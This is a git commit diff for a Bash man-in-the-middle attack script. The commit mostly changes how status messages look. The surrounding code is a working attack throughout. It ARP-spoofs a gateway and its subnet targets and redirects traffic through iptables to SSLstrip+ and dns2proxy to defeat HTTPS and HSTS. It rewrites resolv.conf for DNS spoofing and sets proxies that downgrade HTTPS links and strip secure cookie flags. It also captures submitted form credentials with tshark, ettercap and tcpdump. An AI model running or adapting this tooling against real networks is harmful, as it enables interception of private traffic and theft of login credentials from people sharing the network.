07442d2a3236d1b0aaa04cd9b914e023e7b0b20b
Magdy Moustafa <sakafa_magdy@yahoo.com>
2018-06-07 09:06:07 -0400

    Add files via upload

--- modules/net/main.sh
+++ modules/net/main.sh
@@ -85,13 +85,13 @@ fi
 if [[ $( echo $inpt | grep -w '\-i' ) =~ '-i' ]] || [[ $inpt =~ '--interface' ]] ; then
    interface=$( echo $inpt | sed 's/ /\n/g' | grep -e '-i' -e '--interface' -A 1 | awk NR==2 )
 else
-   echo -e "${red}█ specify an interface"
+   echo -e "${red}[${green}x${red}]${white} specify an interface"
    exit 1
 fi
 if [[ $inpt =~ '-g' ]] || [[ $inpt =~ '--gateway' ]] ; then
    gateway=$( echo $inpt | sed 's/ /\n/g' | grep -e '-g' -e '--gateway' -A 1 | awk NR==2 )
 else
-   echo -e "${red}█ specify gateway"
+   echo -e "${red}[${green}+${red}]${white} specify gateway"
    exit 1
 fi
 if   [[ $inpt =~ '-o' ]] || [[ $inpt =~ '--savelog'    ]] ; then
@@ -162,33 +162,33 @@ subnet=$(ip -d route | grep $interface | grep / | awk {'print $2 '})
 ############################################################################################################
 
 cd "${date}_output"
-echo -e "${red}█ Time $date"
-echo -e "${red}█ Distro $distro"
-echo -e "${red}█ Interface $interface"
-echo -e "█ Local IP $myip"
-echo -e "█ Gateway $gateway"
-echo -e "█ Target(s) $target"
+echo -e "${red} [${green}+${red}]${white} Time $date"
+echo -e "${red} [${green}+${red}]${white} Distro $distro"
+echo -e "${red} [${green}+${red}]${white} Interface $interface"
+echo -e "${red} [${green}+${red}]${white} Local IP $myip"
+echo -e "${red} [${green}+${red}]${white} Gateway $gateway"
+echo -e "${red} [${green}+${red}]${white} Target(s) $target"
 function iptables_hsts {
-   echo -e "${yellow}█ iptables --flush"
-   echo -e "${blue}█ iptables --flush -t nat"
-   echo -e "${red}█ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000"
-   echo -e "${green}█ iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53 "
-   echo -e "$blue█ Enable SSLstrip+"
+   echo -e "${red} [${green}+${red}]${white} iptables --flush"
+   echo -e "${red} [${green}+${red}]${white} iptables --flush -t nat"
+   echo -e "${red} [${green}+${red}]${white} iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000"
+   echo -e "${red} [${green}+${red}]${white} iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53 "
+   echo -e "${red} [${green}+${red}]${white} Enable SSLstrip+"
    iptables --flush
    iptables --flush -t nat
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
    iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
    if [[ $savelog == "" ]] ; then
-      echo -en "${purp}█ Do you want to save sslstrip+ logs at ${white}log.txt [y/n]: " ; read logz
+      echo -en "${red} [${green}+${red}]${white} Do you want to save sslstrip+ logs at ${white}log.txt [y/n]: " ; read logz
       if [[ $logz == "y" ]] || [[ $logz == "Y" ]] ; then
-            echo -e "${green}█ saving session logs at log.txt"
+            echo -e "${red} [${green}+${red}]${white} saving session logs at log.txt"
             sslstrip -l 9000 -a -w log.txt 2> /dev/null 1> /dev/null &
          else
-         echo -e "${red}█ NO Logs will be saved for this session"
+         echo -e "${red} [${green}+${red}]${white} NO Logs will be saved for this session"
           sslstrip -l 9000 -a 2> /dev/null 1> /dev/null &
       fi
     else
-      echo -e "${green}█ saving session logs at $savelog"
+      echo -e "${red} [${green}+${red}]${white} saving session logs at $savelog"
       sslstrip -l 9000 -a -w $savelog 2> /dev/null 1> /dev/null  &
    fi
 }
@@ -213,7 +213,7 @@ function dns_2_proxy {
       cd ..
       cd output/"${date}_output"
    else
-      echo -e "${red}█ dns2proxy doesn't exist"
+      echo -e "${red} [${green}x${red}]${white} dns2proxy doesn't exist"
       exit
    fi
 }
@@ -222,24 +222,23 @@ function iptables_burp {
    iptables --flush
    iptables -t nat -A PREROUTING -p tcp --dport 80  -j DNAT --to-destination $myip
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $myip
-   echo -en "${yellow}"
-   echo "█ iptables --flush"
-   echo '█ Iptables -t nat -A PREROUTING -p tcp --dport 80  -j DNAT --in-interface'" $interface"' --to-destination'" $myip"
-   echo '█ Iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --in-interface'" $interface "'--to-destination'" $myip"
+   echo -e "${red} [${green}+${red}]${white} iptables --flush"
+   echo -e '${red} [${green}+${red}]${white} Iptables -t nat -A PREROUTING -p tcp --dport 80  -j DNAT --in-interface'" $interface"' --to-destination'" $myip"
+   echo -e '${red} [${green}+${red}]${white} Iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --in-interface'" $interface "'--to-destination'" $myip"
    if [[ $burp == "on" ]] ; then
-      echo '█ Now open Burpsuite > Proxy > Options'
-      echo '█ Add proxy Listeners on ports 443,80 .. enable ( Support Invisible Proxying )'
-      echo '█ And in Response Modification Enable ( Convert HTTPS links to HTTP )'
-      echo '█ And ( Remove secure Flag from cookies )'
+      echo -e '${red} [${green}+${red}]${white} Now open Burpsuite > Proxy > Options'
+      echo -e '${red} [${green}+${red}]${white} Add proxy Listeners on ports 443,80 .. enable ( Support Invisible Proxying )'
+      echo -e '${red} [${green}+${red}]${white} And in Response Modification Enable ( Convert HTTPS links to HTTP )'
+      echo -e '${red} [${green}+${red}]${white} And ( Remove secure Flag from cookies )'
    elif [[ $mitmproxy == "on" ]] ; then
         xterm -geometry 90x30-0-0 -e "mitmproxy -T -p 443 -v -e $proxyargs" &
         xterm -geometry 90x30-300-0 -e "mitmproxy -T -p 80 -v -e $proxyargs" &
    fi
 }
 function scan {
-   echo -e "${blue}█ Enable ARPspoof"
+   echo -e "${red} [${green}+${red}]${white} Enable ARPspoof"
    if [[ $target =~ '/24' ]] || [[ $target == "/16" ]] ; then
-      echo -e "${white}█ Scanning subnet ..."
+      echo -e "${red} [${green}+${red}]${white} Scanning subnet ..."
       arp-scan $target 2> /dev/null | grep -ve Interface -e Starting -e received -e Ending | awk {' print $1 "   " $2 '} > ips_macs.txt
       cat ips_macs.txt | awk {' print $1 '} > ips.txt
       cat ips.txt | grep -wve $gateway -e $myip | sed '/^\s*$/d' > ipst.txt
@@ -252,7 +251,7 @@ function scan {
          else
             xterm -geometry 90x20-$xx-$xxx  -fg red -e arpspoof -t $gateway $t1 -r &
          fi
-         echo -e "${green}█ spoof Target $t1"
+         echo -e "${red} [${green}+${red}]${white} spoof Target $t1"
          let xx+=10
          let xxx+=10
       done
@@ -264,7 +263,7 @@ function scan {
           else
              xterm -geometry 90x20-20-400  -fg red -e arpspoof -t $gateway $i -r &
           fi
-             echo -e "${green}█ spoof Target $i"
+             echo -e "${red} [${green}+${red}]${white} spoof Target $i"
              arp-scan $i 2> /dev/null | grep -ve Interface -e Starting -e received -e Ending | awk {' print $1 "   " $2 '} >> ips_macs.txt
        }
        if [[ $target =~ "," ]] ; then
@@ -274,7 +273,7 @@ function scan {
                 action
              else
                 if [[ $( cat ip_st.txt ) =~ "Unreachable" ]] || [[ $( cat ip_st.txt ) =~ '100% packet loss' ]] || [[ $( cat ip_st.txt ) =~ '0 received' ]] ; then
-                   echo -e "${red}█ $i is Unreachable, if IP is blocking ICMP packets run with --no-check"
+                   echo -e "${red} [${green}+${red}]${white} $i is Unreachable, if IP is blocking ICMP packets run with --no-check"
                 else
                     action
                 fi
@@ -288,7 +287,7 @@ function scan {
              else
                 xterm -geometry 90x20-20-400  -fg red -e arpspoof -i $interface -t $gateway $target -r &
              fi
-             echo -e "${green}█ spoof Target $target"
+             echo -e "${red} [${green}+${red}]${white} spoof Target $target"
              arp-scan $target 2> /dev/null | grep -ve Interface -e Starting -e received -e Ending | grep $target | awk {' print $1 "   " $2 '} > ips_macs.txt
           }
           ping -c 1 $target > ip_st.txt
@@ -296,39 +295,39 @@ function scan {
               action1
           else
              if [[ $( cat ip_st.txt ) =~ "Unreachable" ]] || [[ $( cat ip_st.txt ) =~ '100% packet loss' ]] || [[ $( cat ip_st.txt ) =~ '0 received' ]] ; then
-                echo -e "${red}█ $target is Unreachable, if IP is blocking ICMP packets run with --no-check"
+                echo -e "${red} [${green}+${red}]${white} $target is Unreachable, if IP is blocking ICMP packets run with --no-check"
                 exit
              else
                 action1
              fi
           fi
        else
-          echo -e "${red}█ Couldn't identify target(s)"
+          echo -e "${red} [${green}+${red}]${white} Couldn't identify target(s)"
           exit
        fi
    fi
-   echo -e "$blue█ spoof Gateway $gateway"
+   echo -e "${red} [${green}+${red}]${white} spoof Gateway $gateway"
 
 }
 
 function capture_creds {
    if [[ $ettercap == "on" ]] || [[ $ettercap == "ON" ]] && [[ $tshark == "on" ]] || [[ $tshark == "ON" ]] ; then
-      echo -e "${blue}█ Enable Tshark"
-      echo -e "${blue}█ Enable Ettercap"
+      echo -e "${red} [${green}+${red}]${white} Enable Tshark"
+      echo -e "${red} [${green}+${red}]${white} Enable Ettercap"
       xterm -geometry 90x55+0+100 -fg green -e bash -c "tshark -i $interface -Y 'http.request.method == POST' -VVV | grep -i form" &
       xterm -geometry 90x55-550+100 -fg purple -e bash -c "ettercap -Tq -w dump" &
    elif [[ $ettercap == "on" ]] || [[ $ettercap == "ON" ]] ; then
-      echo -e "${blue}█ Enable Ettercap"
+      echo -e "${red} [${green}+${red}]${white} Enable Ettercap"
       xterm -geometry 90x55+0+100 -fg green -e bash -c "ettercap -Tq -w dump" &
    elif [[ $tshark == "on" ]] || [[ $tshark == "ON" ]] ; then
-      echo -e "${blue}█ Enable Tshark"
+      echo -e "${red} [${green}+${red}]${white} Enable Tshark"
       xterm -geometry 90x55+0+100 -fg green -e bash -c "tshark -i $interface -Y 'http.request.method == POST' -VVV | grep -i form" &
    fi
    if [[ $driftnet == "on" ]] || [[ $driftnet == "ON" ]] ; then
-      echo -e "$blue█ Enable Driftnet"
+      echo -e "${red} [${green}+${red}]${white} Enable Driftnet"
    fi
    if [[ $tshark == "on" ]] || [[ $driftnet == "on" ]] ; then
-      echo -e "${blue}█ Saving captured packets at ${date}_output/tshark.pcap"
+      echo -e "${red} [${green}+${red}]${white} Saving captured packets at ${date}_output/tshark.pcap"
       if [[ $silent == 'on' ]] ; then
          tshark -i wlan0 -w tshark.pcap 2> /dev/null 1> /dev/null &
       else
@@ -336,24 +335,24 @@ function capture_creds {
       fi
    fi
    if [[ $tcpdump == "on" ]] ; then
-      echo -e "${blue}█ Enable TCPdump"
+      echo -e "${red} [${green}+${red}]${white} Enable TCPdump"
       xterm -geometry 90x55+0+100 -fg white -e bash -c "tcpdump -s 0 -A 'tcp dst port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'" &
    fi
    if [[ $iptraf == "on" ]] ; then
-      echo -e "${blue}█ Enable IPtraf-ng"
+      echo -e "${red} [${green}+${red}]${white} Enable IPtraf-ng"
      xterm -geometry 90x50-0-0 -fg white -e "iptraf-ng -i $interface" &
    fi
    if [[ $urlsnarf == "on" ]] || [[ $urlsnarf == "ON" ]] ; then
-      echo -e "${blue}█ Enable urlsnarf"
+      echo -e "${red} [${green}+${red}]${white} Enable urlsnarf"
       urlsnarf > urlsnarf.log 2> /dev/null &
-      echo -e "${green}█ saving urlsnarf logs at output/${date}_output/urlsnarf.log"
+      echo -e "${red} [${green}+${red}]${white} saving urlsnarf logs at output/${date}_output/urlsnarf.log"
    fi
    if [[ $etherape == "on" ]] ; then
-      echo -e "${blue}█ Enable Etherape"
+      echo -e "${red} [${green}+${red}]${white} Enable Etherape"
       etherape 2> /dev/null 1> /dev/null &
    fi
    if [[ $tshark2 == "on" ]] ; then
-      echo -e "${blue}█ Enable Tshark+ "
+      echo -e "${red} [${green}+${red}]${white} Enable Tshark+ "
        xterm -geometry 90x20-0-0 -fg orange -e "tshark -i $interface -Y 'http.request.method == GET || http.request.method == POST'" &
    fi
    if [[ $dnsspoof == "on" ]] ; then
@@ -363,7 +362,7 @@ function capture_creds {
          if ! [[ -f /etc/resolv.conf ]] ; then
              echo "nameserver $gateway" > /etc/resolv.conf
          fi
-         echo -e "${yellow}█ Modify resolv.conf file"
+         echo -e "${red} [${green}+${red}]${white} Modify resolv.conf file"
          cp /etc/resolv.conf /etc/resolv.conf.copy
          echo "nameserver 127.0.0.1" > /etc/resolv.conf
          cp $dnsfile dns2proxy/domains.cfg
@@ -371,7 +370,7 @@ function capture_creds {
              dns_2_proxy
          fi
       else
-         echo -e "${red}█ Couldn't find dns file to spoof with"
+         echo -e "${red} [${green}+${red}]${white} Couldn't find dns file to spoof with"
          exit 1
       fi
    fi
@@ -379,26 +378,26 @@ function capture_creds {
 
 
 if [[ $hsts == 'on' ]] ; then
-       echo -e "$red█ Activating HSTS mode "
+       echo -e "${red} [${green}+${red}]${white} Activating HSTS mode "
        iptables_hsts
        dns_2_proxy
 elif [[ $burp == 'on' ]] ; then
-       echo -e "${red}█ Activating Burp mode "
+       echo -e "${red} [${green}+${red}]${white} Activating Burp mode "
        iptables_burp
 fi
-echo -e "${purp}█ echo 1 > /proc/sys/net/ipv4/ip_forward"
+echo -e "${red} [${green}+${red}]${white} echo 1 > /proc/sys/net/ipv4/ip_forward"
 echo 1 > /proc/sys/net/ipv4/ip_forward
 scan
 capture_creds
 if [[ $nocheck != "on" ]] ; then
-   echo -e "${blue}█ Activating respoofer, My gift to the MITM world :)"
+   echo -e "${red} [${green}+${red}]${white} Activating respoofer, My gift to the MITM world :)"
    xterm -geometry 90x15-0-0 -fg green -T respoofer -e bash -c "../../respoof.sh $interface" &
 fi
 
 while true ; do
-    echo -en "${blue}█ Exit [Y]: "
+    echo -en "${red} [${green}+${red}]${white} Exit and stop the attack ? [Y]: "
     read f 2> /dev/null
-    if [[ $f == "y" ]] || [[ $f == "Y" ]] ; then
+    if [[ $f == "y" ]] || [[ $f == "Y" ]] || [[ $f == "" ]]; then
        kill `pgrep xterm`    2> /dev/null 1> /dev/null
        kill `pgrep driftnet` 2> /dev/null 1> /dev/null
        kill `pgrep arpspoof` 2> /dev/null 1> /dev/null
